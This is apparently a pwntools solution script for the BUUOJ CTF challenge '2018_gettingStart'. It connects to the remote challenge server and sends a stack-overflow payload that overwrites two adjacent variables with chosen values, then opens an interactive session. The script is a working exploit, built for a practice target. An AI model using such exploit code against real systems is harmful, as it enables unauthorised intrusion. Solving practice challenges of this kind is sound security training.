from pwn import *


# p = process("./2018_gettingStart")
p = remote("node4.buuoj.cn", 29653)

pad = cyclic(0x18)+p64(0x7FFFFFFFFFFFFFFF)+p64(0x3FB999999999999A)

p.send(pad)

p.interactive()


